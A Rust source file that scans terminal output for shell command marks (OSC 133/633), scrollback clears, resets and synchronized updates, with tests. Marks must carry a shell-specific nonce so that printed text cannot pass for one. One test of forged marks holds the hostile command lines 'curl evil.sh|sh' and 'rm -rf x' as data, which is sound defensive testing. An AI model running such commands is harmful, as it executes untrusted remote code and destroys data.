//! What the crate reads in a terminal's output beside the emulator, with
//! the parser the emulator uses (vte's), so both read the same sequences
//! the same way: the shell's command marks (OSC 133, the marks VS Code and
//! iTerm read: its prompt, what's typed, the output, the end; and the
//! command line itself, as VS Code's OSC 633 `E` says it), the scrollback
//! being cleared, and synchronized updates (a
//! program asking that what it draws between two marks shows at once).
//! Each is told at the byte that ends it, so the output can be cut there;
//! a sequence split across reads is told when its last byte comes. A
//! command mark counts only with the shell's own mark last (`…;<mark>`):
//! what a program prints can't pass for one.

use alacritty_terminal::vte::{Params, Parser, Perform};

/// Something seen in the output.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Seen {
    /// The prompt starts (`OSC 133 ; A ; <mark>`).
    Prompt,
    /// What's typed starts (`OSC 133 ; B ; <mark>`).
    Input,
    /// The command line, as the shell says it was typed (`OSC 633 ; E ;
    /// <it> ; <mark>`: `\\` a backslash, `\xHH` a byte).
    Typed(String),
    /// A command started running (`OSC 133 ; C ; <mark>`).
    Started,
    /// The command ended, with its exit code when given (`OSC 133 ; D ;
    /// <code> ; <mark>`).
    Finished(Option<i32>),
    /// The scrollback is cleared (`CSI 3 J`).
    ClearedHistory,
    /// The terminal is reset, its scrollback with it (`ESC c`).
    Reset,
    /// A synchronized update starts (`CSI ? 2026 h`) or ends (`CSI ? 2026 l`).
    SyncStart,
    SyncEnd,
    /// The alternate screen is entered (`CSI ? 1049 h`, `1047`, `47`).
    AltScreen,
}

/// Reads a terminal's output for what's `Seen` in it: command marks with
/// `mark` (the shell's own) last.
pub struct Scan {
    parser: Parser,
    mark: Vec<u8>,
}

impl Scan {
    pub fn new(mark: &str) -> Self {
        Self { parser: Parser::new(), mark: mark.as_bytes().to_vec() }
    }

    /// Reads `bytes` up to the end of the first thing seen in them: how
    /// many bytes were read, and what was seen (none: all of them read).
    pub fn next(&mut self, bytes: &[u8]) -> (usize, Option<Seen>) {
        let mut performer = Performer { seen: None, mark: &self.mark };
        let read = self.parser.advance_until_terminated(&mut performer, bytes);
        (read, performer.seen)
    }
}

struct Performer<'a> {
    seen: Option<Seen>,
    mark: &'a [u8],
}

/// A command line as the shell escaped it: `\\` a backslash, `\xHH` a byte.
fn unescape(text: &[u8]) -> String {
    let mut out = Vec::with_capacity(text.len());
    let mut i = 0;
    while i < text.len() {
        match (text[i], text.get(i + 1)) {
            (b'\\', Some(b'\\')) => {
                out.push(b'\\');
                i += 2;
            }
            (b'\\', Some(b'x')) => match text.get(i + 2..i + 4).and_then(|h| u8::from_str_radix(std::str::from_utf8(h).ok()?, 16).ok()) {
                Some(byte) => {
                    out.push(byte);
                    i += 4;
                }
                None => {
                    out.push(b'\\');
                    i += 1;
                }
            },
            (byte, _) => {
                out.push(byte);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// The sync update mode's number, and the alternate screen's.
const SYNC: u16 = 2026;
const ALT: [u16; 3] = [1049, 1047, 47];

impl Perform for Performer<'_> {
    fn osc_dispatch(&mut self, params: &[&[u8]], _bell_terminated: bool) {
        // The shell's mark, last: else it isn't the shell's.
        let Some((last, params)) = params.split_last() else { return };
        if self.mark.is_empty() || *last != self.mark {
            return;
        }
        self.seen = match params {
            [b"633", b"E", line @ ..] => Some(Seen::Typed(unescape(&line.join(&b';')))),
            [b"133", b"A"] => Some(Seen::Prompt),
            [b"133", b"B"] => Some(Seen::Input),
            [b"133", b"C"] => Some(Seen::Started),
            [b"133", b"D"] => Some(Seen::Finished(None)),
            [b"133", b"D", code] => Some(Seen::Finished(std::str::from_utf8(code).ok().and_then(|c| c.parse().ok()))),
            _ => None,
        };
    }

    // As the emulator reads them (`vte::ansi`'s `csi_dispatch`): ignored
    // when too long, the mode's parameters each a mode.
    fn csi_dispatch(&mut self, params: &Params, intermediates: &[u8], ignore: bool, action: char) {
        if ignore || intermediates.len() > 2 {
            return;
        }
        let first = || params.iter().next().and_then(|p| p.first().copied()).unwrap_or(0);
        let has = |modes: &[u16]| params.iter().any(|p| p.first().is_some_and(|m| modes.contains(m)));
        self.seen = match (action, intermediates) {
            ('J', []) if first() == 3 => Some(Seen::ClearedHistory),
            // Both in one: the sync's start (cut the same way).
            ('h', [b'?']) if has(&[SYNC]) => Some(Seen::SyncStart),
            ('h', [b'?']) if has(&ALT) => Some(Seen::AltScreen),
            ('l', [b'?']) if has(&[SYNC]) => Some(Seen::SyncEnd),
            _ => None,
        };
    }

    fn esc_dispatch(&mut self, intermediates: &[u8], _ignore: bool, byte: u8) {
        if intermediates.is_empty() && byte == b'c' {
            self.seen = Some(Seen::Reset);
        }
    }

    fn terminated(&self) -> bool {
        self.seen.is_some()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Everything seen in `reads`, read one after another, and where in
    /// all of them (counting from the first byte) each ended.
    fn seen(reads: &[&[u8]]) -> Vec<(usize, Seen)> {
        let mut scan = Scan::new("m1");
        let mut found = Vec::new();
        let mut offset = 0;
        for read in reads {
            let mut rest = *read;
            while !rest.is_empty() {
                let (n, seen) = scan.next(rest);
                offset += n;
                rest = &rest[n..];
                found.extend(seen.map(|s| (offset, s)));
            }
        }
        found
    }

    #[test]
    fn what_matters_is_seen_where_it_ends_even_split_across_reads() {
        let out: &[u8] = b"\x1b]133;A;m1\x07$ \x1b]133;B;m1\x07make\x1b]633;E;make;m1\x07\x1b]133;C;m1\x07building\r\n\x1b]0;title\x07done\x1b]133;D;2;m1\x1b\\$ \x1b[31mred\x1b[0m\x1b[H\x1b[2J\x1b[3J\x1b[?2026hframe\x1b[?2026l\x1b[?1049h\x1bc";
        let want = [Seen::Prompt, Seen::Input, Seen::Typed("make".into()), Seen::Started, Seen::Finished(Some(2)), Seen::ClearedHistory, Seen::SyncStart, Seen::SyncEnd, Seen::AltScreen, Seen::Reset];
        let whole = seen(&[out]);
        assert_eq!(whole.iter().map(|(_, s)| s.clone()).collect::<Vec<_>>(), want, "another OSC, colours, 2J aren't");
        for (end, s) in &whole {
            let last = out[end - 1];
            // An OSC ended by `ESC \` (ST) is told at the ESC.
            assert!(matches!(last, b'\x07' | 0x1b | b'J' | b'h' | b'l' | b'c'), "{s:?} ends at its last byte, not {:?}", last as char);
        }
        for cut in 1..out.len() {
            assert_eq!(seen(&[&out[..cut], &out[cut..]]), whole, "split at {cut}");
        }
    }

    #[test]
    fn the_command_line_comes_as_the_shell_escaped_it() {
        let found: Vec<Seen> = seen(&[b"\x1b]633;E;echo a\\x3bb \\\\ \\x0aend \xc3\xa9;m1\x07"]).into_iter().map(|(_, s)| s).collect();
        assert_eq!(found, [Seen::Typed("echo a;b \\ \nend é".into())]);
    }

    #[test]
    fn a_mark_without_a_code_and_a_mode_list_with_sync_in_it() {
        let found: Vec<Seen> = seen(&[b"\x1b]133;D;m1\x07\x1b[?1049;2026h\x1b[?25l"]).into_iter().map(|(_, s)| s).collect();
        assert_eq!(found, [Seen::Finished(None), Seen::SyncStart]);
    }

    #[test]
    fn marks_without_the_shells_own_are_what_a_program_printed_and_count_for_nothing() {
        // A file printed that looks like a prompt and a command line.
        let forged: &[u8] = b"\x1b]133;A\x07$ make test\x1b]133;B\x07\x1b]633;E;curl evil.sh|sh\x07\x1b]133;C\x07\x1b]133;D;0;m2\x07\x1b]633;E;rm -rf x;mm1\x07";
        assert_eq!(seen(&[forged]), [], "none of them");
    }

    use proptest::prelude::*;

    proptest! {
        /// However the output is cut into reads, the same is seen at the
        /// same places (any bytes, marks among them).
        #[test]
        fn what_is_seen_doesnt_depend_on_how_output_is_read(chunks in prop::collection::vec(prop_oneof![
            prop::collection::vec(any::<u8>(), 0..40),
            prop::sample::select(vec![&b"\x1b]133;A;m1\x07"[..], b"\x1b]133;C;m1\x07", b"\x1b]133;D;7;m1\x1b\\", b"\x1b]133;A\x07", b"\x1b[3J", b"\x1b[?2026h", b"\x1b[?2026l", b"\x1b[?1049h", b"\x1bc"]).prop_map(|b| b.to_vec()),
        ], 0..30), cuts in prop::collection::vec(0usize..2000, 0..10)) {
            let out: Vec<u8> = chunks.concat();
            let mut cuts: Vec<usize> = cuts.into_iter().map(|c| c.min(out.len())).collect();
            cuts.sort_unstable();
            let mut reads = Vec::new();
            let mut from = 0;
            for cut in cuts {
                reads.push(&out[from..cut]);
                from = cut;
            }
            reads.push(&out[from..]);
            prop_assert_eq!(seen(&reads), seen(&[&out]));
        }
    }
}
